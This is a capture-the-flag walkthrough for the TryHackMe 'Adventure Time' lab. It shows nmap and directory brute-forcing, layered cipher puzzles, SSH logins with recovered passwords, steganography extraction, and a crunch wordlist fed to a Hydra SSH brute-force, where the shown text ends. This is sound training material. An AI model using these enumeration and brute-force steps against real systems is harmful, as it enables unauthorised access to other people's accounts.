<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/" rel="category tag">TryHackME</a></span>            </div>
            <h1 class="post-title entry-title">Adventure Time TryHackMe Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/adventure-time-tryhackme-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-06-23T16:53:34+00:00">June 23, 2021</time><time class="updated" datetime="2025-06-25T11:49:39+00:00">June 25, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today it is time to solve another challenge called “Adventure Time”. It was created by <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://tryhackme.com/p/n0w4n">n0w4n</a></strong></span>. It is available at TryHackMe for penetration testing practice. The challenge is of hard difficulty even if you have the right basic knowledge and are attentive to little details that are required in the enumeration process. The breakdown of the Machine with redacted flags is as follow:</span></p>
<p><span style="color: #000000;"><strong>Level: Hard</strong></span></p>
<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
<ul>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Enumerating HTTPS Service</span></li>
<li><span style="color: #000000;">Directory Bruteforce using Dirbuster</span></li>
<li><span style="color: #000000;">Enumerating Source Code</span></li>
<li><span style="color: #000000;">Decoding Base32 Code</span></li>
<li><span style="color: #000000;">Decoding ROT13</span></li>
<li><span style="color: #000000;">Enumerating Certificate Details</span></li>
<li><span style="color: #000000;">Editing /etc/hosts file</span></li>
<li><span style="color: #000000;">Enumerating HTTP Service</span></li>
<li><span style="color: #000000;">Directory Bruteforce using Dirbuster</span></li>
<li><span style="color: #000000;">Enumerating Source Code</span></li>
<li><span style="color: #000000;">Decoding Morse Code</span></li>
<li><span style="color: #000000;">Directory Bruteforce using Dirbuster</span></li>
<li><span style="color: #000000;">Enumerating Source Code</span></li>
<li><span style="color: #000000;">Decoding AES Encoding</span></li>
<li><span style="color: #000000;">Enumerating Service on 31337</span></li>
<li><span style="color: #000000;">Getting the SSH Credentials</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
<ul>
<li><span style="color: #000000;">Logging in as apple-guards user</span></li>
<li><span style="color: #000000;">Reading Flag1</span></li>
<li><span style="color: #000000;">Enumerating Emails</span></li>
<li><span style="color: #000000;">Enumerating marceline user files</span></li>
<li><span style="color: #000000;">Decoding Vigenère Cipher</span></li>
<li><span style="color: #000000;">Getting password for marceline user</span></li>
<li><span style="color: #000000;">Logging in as marceline user</span></li>
<li><span style="color: #000000;">Reading Flag2</span></li>
<li><span style="color: #000000;">Enumerating User Permissions</span></li>
<li><span style="color: #000000;">Decoding Spoon Binary text</span></li>
<li><span style="color: #000000;">Getting Magic Word</span></li>
<li><span style="color: #000000;">Getting credentials for Peppermint-butler user</span></li>
<li><span style="color: #000000;">Logging in as peppermint-butler user</span></li>
<li><span style="color: #000000;">Reading Flag3</span></li>
<li><span style="color: #000000;">Transferring Image file using wget</span></li>
<li><span style="color: #000000;">Enumerating User Permissions</span></li>
<li><span style="color: #000000;">Enumerating Steghide Password</span></li>
<li><span style="color: #000000;">Extracting Zip File from Image</span></li>
<li><span style="color: #000000;">Enumerating Zip Password</span></li>
<li><span style="color: #000000;">Extracting gunter user details</span></li>
<li><span style="color: #000000;">Creating Dictionary using crunch</span></li>
<li><span style="color: #000000;">Bruteforcing gunter user credentials via Hydra</span></li>
<li><span style="color: #000000;">Logging in as gunter user</span></li>
<li><span style="color: #000000;">Reading Flag4</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Enumerating for SUID</span></li>
<li><span style="color: #000000;">Exploiting the SUID on exim4</span></li>
<li><span style="color: #000000;">Enumerating Flag5</span></li>
<li><span style="color: #000000;">Reading Flag5</span></li>
</ul>
<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
<p><span style="color: #000000;">There are 5 flags in this machine to discover. After Booting up the target machine from the <a style="color: #000000;" href="https://tryhackme.com/room/adventuretime">TryHackMe: Adventure Time CTF Page</a>, an IP will be assigned to the machine and will be visible on that page as well.</span></p>
<p><span style="color: #000000;"><strong>IP Address: 10.10.230.20</strong></span></p>
<h3><span style="color: #800000;">Network Scanning</span></h3>
<p><span style="color: #000000;">We will start a nmap scan with the -sV for performing a Version Scan on the target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV 10.10.230.20</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TMG8DVFTH1s/YNNdkb5SCBI/AAAAAAAAwmo/4qHmw9rEy4M9md4zuPxCt7ZSXBuG2WDtACLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">We have a bunch of services running on the target machine. Now, we have the 21 (FTP), 22 (SSH), 80 (HTTP), 443 (HTTPS), 31337 (Unknown Service). We will take a look at the Unknown service in a bit.</span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">We cannot enumerate the FTP service and the SSH service since we lack the credentials for both. That leaves us the HTTP, HTTPS, and the Unknown service. We will begin our enumeration with the HTTPS service since there was no web page available on the HTTP. We see that there is a website loaded that has an image of Finn from Adventure Time telling us that he has lost Jake and wants our help in finding him.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">https://10.10.230.20</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JMm569wcLoA/YNNdwWH-xvI/AAAAAAAAwms/nfZRczfYJS8Q-fgsCIQ9HQVwjQTCVwIdACLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Since there is not much to go on and the image seems to be all that is available to us at the moment, we decided to perform a Directory Bruteforce. We will be using the OWASP Dirbuster for this task. We have chosen the dictionary as directory-list-lowercase-2.3-medium.txt</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-emhc8jQEq5I/YNNd0LuZg7I/AAAAAAAAwmw/07jTUJ65K5IHAUmbUe2dlp6b-rTQawkUgCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">In a few moments, we were able to identify the directory by the name of candybar. Let’s check it out.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BuXb8afWP-o/YNNd6_A-xPI/AAAAAAAAwm0/Ewu-NK-d29sepKd4_o3EBZc8eE4P9nXZACLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">We have another message from Finn, it says that Jake has given him a magic word that can be helpful to Find him. It seems like a Base32 encoded text. </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">https://10.10.230.20/candybar</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EKiPcUtmbdk/YNNd_IISfzI/AAAAAAAAwm4/PiwB6zNoa3wDjoMXikgSoHfYvWQiaRBcwCLcBGAsYHQ/s16000/5.png"/></span></p>
<h4><span style="color: #000000;">Decoding Hidden Messages and SSL Inspection</span></h4>
<p><span style="color: #000000;">Checking the Page Source of the Webpage, we see that text has been commented in the source code for us to copy as shown in the image below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">view-source:https://10.10.230.20/candybar
&lt;!-- KBQWY4DONAQHE53UOJ5CA2LXOQQEQSCBEBZHIZ3JPB2XQ4TQNF2CA5LEM4QHEYLKORUC4=== --&gt;</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-9e7CIgKN_Qc/YNNeFGhASjI/AAAAAAAAwnA/rcvAvMYTBBc7_YhTrnq8vPCr2kZkmYxywCLcBGAsYHQ/s16000/6.png"/></strong></span></p>
<p><span style="color: #000000;">We will use the combination of the echo command and the base32 to decode the encoded magic text. We got another set of texts that seems to be another encoding. Upon inspection, it was clear that it was ROT13 encoding.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "KBQWY4DONAQHE53UOJ5CA2LXOQQEQSCBEBZHIZ3JPB2XQ4TQNF2CA5LEM4QHEYLKORUC4===" | base32 -d</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-r1klE3IbJ5w/YNNeJyM9kCI/AAAAAAAAwnE/zzCaSl6_H0Y9mkw-ykPWfqWM5Uv_zSrHACLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">After we used the online decoder for ROT to decode the text and found the secret message intended for us. It says “ALWAYSCHECKTHESSLCERTIFICATEFORCLUES”. That is a good hint for us.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uiT6-NZnAWk/YNNeOAZ0gWI/AAAAAAAAwnI/KzOyDFgSOAwzfdhTqagBSZoNru4NHa-QQCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">Going back to the browser and clicking the Padlock logo before the URL to open the Site Security Section. We click on the More Information Button to get access to the SSL certificate.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wjxWNp8HZFg/YNNeS_JoGaI/AAAAAAAAwnM/nXFens6j64YbyslefqvD7h3GgVK20FEqwCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">We get the Page Info window opened. Hereunder the Security Section we have the View Certificate button as demonstrated in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-47PdruF7ac8/YNNeXT3UoRI/AAAAAAAAwnU/bW9vG7cwAhoP-PT4DV7qQOo75pBXTOUVwCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">Inside the Certificate Viewer, we decided to check out the Details Tab and found that the Issuer has the Field Value contains a username “bubblegum”, a domain name “land-of-ooo.com” and a common name “adventure-time.com”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eiFQbzuDbWA/YNNetR2Z-oI/AAAAAAAAwno/6LL2-uKr10Eh9ucu9hx73grR2qbEm9sQgCLcBGAsYHQ/s16000/11.png"/></span></p>
<h4><span style="color: #000000;">Discovering New Domains and Credentials</span></h4>
<p><span style="color: #000000;">Since we have another domain name, to inspect the website associated with it, we need to make its entry inside the /etc/hosts file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/hosts
cat /etc/hosts</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-A9yXOpgA86M/YNNexx_pGJI/AAAAAAAAwns/mz7CcyEo40Ak42nk-LxKh_sSRElnhvbkACLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">After adding <em data-start="84" data-end="101">land-of-ooo.com</em> in the hosts file, we then try to open it in the web browser. Eventually, we find Finn! He mentions that we need to find the reset code for the BMO. Moreover, he thinks that it is on B’s laptop. However, he warns that it is well protected.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">https://land-of-ooo.com</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-Mxr34Hbe85Y/YNNe1mF-46I/AAAAAAAAwnw/HTiwOJkoQjENQDZe4rYjHAHoHDz-knCewCLcBGAsYHQ/s16000/13.png"/></strong></span></p>
<p><span style="color: #000000;">Since we were unable to find any more details from the webpage and the image, we decided to perform another Directory Bruteforce on the newly found domain. We used the same dictionary as before.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rpjHobmyAUU/YNNe5Z7kQBI/AAAAAAAAwn0/QRc6TeTNqiwPfmK-1U2x-EVL58hKEHoiQCLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">This time we were able to enumerate a page by the name of yellowdog.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ytpwKfe5vEE/YNNe9TlII0I/AAAAAAAAwn4/Q285GRelMiESCMiUeQ9tHgpu4gnbLue9wCLcBGAsYHQ/s16000/15.png"/></span></p>
<p><span style="color: #000000;">When we open the newly discovered directory in the web browser, another image of Jake informs us that the device that Finn and Jake need, i.e., B’s Laptop, is guarded by Banana Guard. If you are at all familiar with the Banana guards, you would know that it won’t be that difficult to bypass them.</span></p>
<h5><span style="color: #000000;">https://land-of-ooo.com/yellowdog</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OuUi6VFLZrk/YNNfAxpBJmI/AAAAAAAAwn8/vi0D2u44jEYwsTlo04ezo-gE7vF2kpZ_QCLcBGAsYHQ/s16000/16.png"/></span></p>
<p><span style="color: #000000;">But still, with the information about Banana Guards, we are don’t have any direct way to proceed. We decided to run another Directory Bruteforce. We got the bananastock directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_CPrsxU2Y0Y/YNNfFafU79I/AAAAAAAAwoE/ZBkT3iihgPwtF7U0la3B735mJDaBYozcwCLcBGAsYHQ/s16000/17.png"/></span></p>
<p><span style="color: #000000;">Upon opening the bananastock directory in the web browser, we see an image of the Banana Guards. They are chatting about the password of the application. One guard asks another if he changed the password. He replies to the password in morse code.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">https://land-of-ooo.com/yellowdog/bananastock</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ppb-ORtXeno/YNNfJyHQLbI/AAAAAAAAwoM/TBFSKQ6_DT8ETY6WmouNLli7zJxupUIaACLcBGAsYHQ/s16000/18.png"/></span></p>
<p><span style="color: #000000;">Since we need to decode the morse code, it will be better if we can copy the encoded text. Upon checking the source code, we found the morse code commented as shown in the image below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">view-source:https://land-of-ooo.com/yellowdog/bananastock
&lt;!-- _/..../.\_.../._/_./._/_./._/...\._/._./.\_/..../.\_..././.../_/_._.__/_._.__/_._.__ --&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2Ulnmy_Q0Ao/YNNfOHEVZJI/AAAAAAAAwoQ/FWp9jYqsvqMCrDMlyUICYy2EqyOp19aGQCLcBGAsYHQ/s16000/19.png"/></span></p>
<p><span style="color: #000000;">We used Cyber Chef for decoding the morse code. After trying a bunch of decoders and options, we tried the Forward Slash as the Letter Delimiter and Back Slash as Word Delimiter. The text decoded as THE BANANAS ARE THE BEST!!!.</span></p>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-_h7hppGfgak/YNNfR-aV21I/AAAAAAAAwoY/pcpSKtNR6gM4_f4ldLsMXEww3cSI29JvwCLcBGAsYHQ/s16000/20.png"/></strong></span></p>
<p><span style="color: #000000;">We know that the password is THE BANANAS ARE THE BEST!!! But still, we don’t what service or user this password belongs to. So, we decided to perform another directory Bruteforce. This time we get the directory by the name of the princess.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-c3uT9kq_kas/YNNfV0WbdrI/AAAAAAAAwog/0mhUgaT4JFEepb155J-XEn2AjqDGaefWwCLcBGAsYHQ/s16000/21.png"/></span></p>
<p><span style="color: #000000;">This time we have another character of Adventure Time Universe i.e., Princess Bubblegum. She tells us that Finn and Jake are after her laptop. She doesn’t want them to read her secret mail. Also, she notes that they cannot trust Banana Guards, so she changes the username and then stores the username in the magic safe to which only she has access. This text indicates that a mail server might exist on the target machine and that she changes the username for the password that we decoded from Banana Guards.</span></p>
<h5>https://land-of-ooo.com/yellowdog/bananastock/princess</h5>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UiT8JumuAxM/YNNfZpiyNpI/AAAAAAAAwok/dTvx9Zx8MsEfJnC_7MpV4joQyR4D54jsQCLcBGAsYHQ/s16000/22.png"/></span></p>
<p><span style="color: #000000;">Checking the source code of the page we see the Secret text commented. It has a key, IV, Mode, Input type, and Output type. This points that this secret text might be AES.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">view-source:https://land-of-ooo.com/yellowdog/bananastock/princess</pre>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;!--
Secrettext = 0008f1a92d287b48dccb5079eac18ad2a0c59c22fbc7827295842f670cdb3cb645de3de794320af132ab341fe0d667a85368d0df5a3b731122ef97299acc3849cc9d8aac8c3acb647483103b5ee44166
Key = my cool password
IV = abcdefghijklmanopqrstuvwxyz
Mode = CBC
Input = hex
Output = raw
--&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YEhMy1bFUlc/YNNfff8tfuI/AAAAAAAAwos/VSohUPG14xgubqJ42l25iL0qVspB1myQACLcBGAsYHQ/s16000/23.png"/></span></p>
<p><span style="color: #000000;">We take all the commented text and the options and go back to the Cyber Chef and enter the text into the input field. Next, we choose the AES Decrypt option and fill in all the required information that we found in the comment. Then, we changed the character encoding to UTF-8. As a result, the secret text was decoded and we had a “the magic safe is accessible at port 31337. the magic word is ricardio” message. Consequently, we now know that we can connect to the service that we encountered earlier.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-B-HNwMNRZmA/YNNfk0iMInI/AAAAAAAAwow/POtuB-f33E0kWS_s95VCRo4CqtlT-Bn_gCLcBGAsYHQ/s16000/24.png"/></span></p>
<p><span style="color: #000000;">We used Telnet to connect to the service running on port 31337. Subsequently, we were greeted with a text that asks for the magic word. We enter the magic word <em data-start="251" data-end="261">ricardio</em>, and as a result, we get the new username that Princess Bubblegum changed. Now, the username is <em data-start="358" data-end="372">apple-guards</em>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">telnet land-of-ooo.com 31337
ricardio</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BbZcF36iNdg/YNNfpVHhxmI/AAAAAAAAwo8/WWRco4iadoAzZHrJ_LOJJOxeXCZkjQRNgCLcBGAsYHQ/s16000/25.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">Afterward, we tried to access the SSH service as the <em data-start="157" data-end="171">apple-guards</em> user. Then, we used the passwords that we decoded earlier, and consequently, we connected to the target machine. Next, we listed the contents of the current directory, and we found the flag1 and a file by the name of flag.txt. However, we are unsure what the file flag.txt is supposed to be.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh apple-guards@land-of-ooo.com
ls
cat flag1
cat flag.txt</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-YSHtX_20yyY/YNNftpjup_I/AAAAAAAAwpA/WOIbmNwcqZMWC2FtR1eF76VvBGFZGiVywCLcBGAsYHQ/s16000/26.png"/></strong></span></p>
<p><span style="color: #000000;">While listing the contents, we found a file by the name of mbox. We read its contents using the cat command and we were able to find another user by the name of marceline. She wrote an email that tells that she has hidden a file and if we can get the answer correct, we can get elevated access.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat mbox</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-EdqKPfYVnHQ/YNNfxYjIW9I/AAAAAAAAwpE/VDp8fvkSkU8o-Ta6fmxsqUwLYDsMkZg9wCLcBGAsYHQ/s16000/27.png"/></strong></span></p>
<h4><span style="color: #000000;">Cracking Marceline’s Challenge</span></h4>
<p><span style="color: #000000;">Since we have a username, we used the find command to find the files that only the marceline user has access to. We find a file by the name of the helper. It was located inside the /etc/fonts directory. We run the file and we are given a key to decode the encoded text. The encoded text is Gpnhkse and the key was gone.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -user marceline -type f 2&gt;/dev/null
/etc/fonts/helper</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1x224Ux90Pw/YNNf1dwBIqI/AAAAAAAAwpM/Ei8aG8hZJYc4Kie-xHxYAiY2Ynkv4hjUACLcBGAsYHQ/s16000/28.png"/></span></p>
<p><span style="color: #000000;">From the looks and the fact that we need a key to decode it. It seems that it Vigenère Cipher. We tried to decipher it and we got the text Abadeer.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ct8C4kQbWwY/YNNf5UeIQLI/AAAAAAAAwpQ/J0PhxOMt6lYjh0fzQdc9opQ7U0WjxqKEACLcBGAsYHQ/s16000/29.png"/></span></p>
<p><span style="color: #000000;">Then, we get back to the helper file and this time we entered the Abadeer and we are granted the password for the marceline user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">/etc/fonts/helper
Abadeer</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_u0umCEZxaY/YNNf9udkuYI/AAAAAAAAwpY/UbQOoa7jjGMehF1C59Urci2-m_Au7VudQCLcBGAsYHQ/s16000/30.png"/></span></p>
<p><span style="color: #000000;">We logged into the marceline user and checked for flags inside its home directory. We find two files. First, we got the flag2.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">su marceline
cd ~
ls
cat flag2</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BnqVmzkbNq0/YNNgCj8CIEI/AAAAAAAAwpg/ONbUFlP7wToXe2GG4gRPh1i9HpQLvVyHACLcBGAsYHQ/s16000/31.png"/></span></p>
<h4><span style="color: #000000;">Steganography and Final Escalation</span></h4>
<p><span style="color: #000000;">We checked the I-got-a-secret.txt file and we saw a message addressed to Finn. It has another one of the encoded puzzles. This time it seems a series of 1s and 0s.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat I-got-a-secret.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9Whc8TqsIeY/YNNgIBu9TPI/AAAAAAAAwpo/U8LqTNmKBikbKg4cOYUR83q3HOVzOJhcwCLcBGAsYHQ/s16000/32.png"/></span></p>
<p><span style="color: #000000;">At first, looked the 1s and 0s seemed to be binary but while trying to decode, we got nothing. So, we went back to the TryHackMe Page and looked for hints. The hint that we got was: “If stuck do research on cutlery” This struck us that series of 1s and 0s with something to do with cutlery must be the Spoon Binary Encoding. Again, using the online decoder, we got another magic word ApplePie.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vuuge9pCh9I/YNNgNTGRQZI/AAAAAAAAwp0/BRLMdC2y2wYaPjXaSULmmzFIHHpLNNoeACLcBGAsYHQ/s16000/33.png"/></span></p>
<p><span style="color: #000000;">Since what we decode turned out to be a magic word, we get back to the service on 31337 that takes a magic word and gives back a password. This time it gave us the username peppermint-butler and the password That Black Magic.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">telnet land-of-ooo.com 31337
ApplePie</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uDjCvVPX7Vs/YNNgSAm5wzI/AAAAAAAAwp4/xy_yStL4mEQqVUM7LIT9nGX7XGJLhqwQgCLcBGAsYHQ/s16000/34.png"/></span></p>
<p><span style="color: #000000;">We logged in as the peppermint-butler user and checked the home directory to find the third flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">su peppermint-butler
cd ~
ls
cat flag3</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-ZP4-6uXXi3w/YNNgZbXVjVI/AAAAAAAAwqA/O2HVf0a3oTQgTvWO7DWwobLviN-3mCsqgCLcBGAsYHQ/s16000/35.png"/></strong></span></p>
<p><span style="color: #000000;">There we also found a jpeg image inside the home directory we used the python server to transfer it to our local attacker machine to take a look and inspect it.</span></p>
<h5><span style="color: #000000;">python3 -m http.server</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aVCfMSNd_8s/YNNgeFM8CXI/AAAAAAAAwqI/2mHzgAjusEkGkNzascKSNyYWwN_yNBfjgCLcBGAsYHQ/s16000/36.png"/></span></p>
<p><span style="color: #000000;">We used the wget command to receive the file to the Kali Machine. It downloaded the butler-1.jpg to this local machine where we can observe it and enumerate it for clues.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://10.10.230.20:8000/butler-1.jpg</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dTBHY9LhhCI/YNNglEMmmpI/AAAAAAAAwqM/DuOvbU2b3-ccpr-5eFrgpR0FfVRXd6D4wCLcBGAsYHQ/s16000/37.png"/></span></p>
<p><span style="color: #000000;">Opening the image file and taking a look at it, we notice that some steganography must be involved. We try to look for any files that the peppermint-butler user owns using the find command as before. We see that we have a steg.txt file and a zip.txt file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -user peppermint-butler -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OcZi4rX-BHM/YNNgqOSNBzI/AAAAAAAAwqU/rdZtEtlCAo0lC6LXr4OKTj5CMdyOrUyZACLcBGAsYHQ/s16000/38.png"/></span></p>
<p><span style="color: #000000;">Reading the steg.txt file we can see that the password for the secret file is ‘ToKeepASecretSafe’. Since we have an image and the file name of this text file is steg.txt, it is quite possible that the secret file that it was talking about must be inside this image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /usr/share/xml/steg.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7h2hGh-N_qA/YNNg6j9H7FI/AAAAAAAAwqk/nlQIHYs36PYAHGlcih-TpYvDZvsRetP_gCLcBGAsYHQ/s16000/39.png"/></span></p>
<p><span style="color: #000000;">Using the steghide extract function, we try to extract any possible hidden files that might be inside the image. We use the password that we extracted earlier. We obtained a zip-compressed file called secrets.zip. However, someone has protected this file with a password.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">steghide extract -sf butler-1.jpg
ls | grep secrets.zip</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-y2ZA3zeYG7I/YNNhA-G5jsI/AAAAAAAAwqo/eG6sBbu1vz8VeJcZrsHLsK-DZfV5XA_JQCLcBGAsYHQ/s16000/40.png"/></span></p>
<p><span style="color: #000000;">Back to the peppermint-butler session, we earlier found a text file by the name of zip.txt. Reading it we got the password for the zip file ‘ThisIsReallySave’.</span></p>
<h5><span style="color: #000000;">cat /etc/php/zip.txt</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zBRQekNjHZ0/YNNhFN7ShyI/AAAAAAAAwqw/FRtN4sY_PLwtuK_Z5tK8CtS0JlEHigasgCLcBGAsYHQ/s16000/41.png"/></span></p>
<p><span style="color: #000000;">Using the password we got from the file, we extra</span></p>
<p><span style="color: #000000;">cted the contents of the secrets.zip file. It contained a text file that tells us that the password might partially be The Ice King s****. Where we don’t know the rest of the password but since the message mentioned Ice King puppet gunter, it is probably the username.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">unzip secrets.zip
cat secrets.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7fl8nvle0SY/YNNhKG-2fVI/AAAAAAAAwq0/Emx86sXEZnk1348Akx7zMG6YdJATVPN7QCLcBGAsYHQ/s16000/42.png"/></span></p>
<p><span style="color: #000000;">We used the crunch to create a password dictionary that can be used to perform Bruteforce. We used the @ wildcard to make the combination of all the possible passwords and moved them into a text file by the name of file.txt.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">crunch 18 18 -t 'The Ice King s@@@@' &gt; file.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HvNRlXmZT_0/YNNhOHl83oI/AAAAAAAAwq8/vTKaKMx2xhMd4VSc4ZHCtgr1R5CSqcdOgCLcBGAsYHQ/s16000/43.png"/></span></p>
<p><span style="color: #000000;">Now that we have the dictionary for the attack, we can use Hydra to perform a Bruteforce for the gunter user. After running for a while, we see that someone cracked the password and the password for the user gunter is The Ice King sucks.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">hydra -l gunter -P file.txt ssh://10.10.230.20</pre>
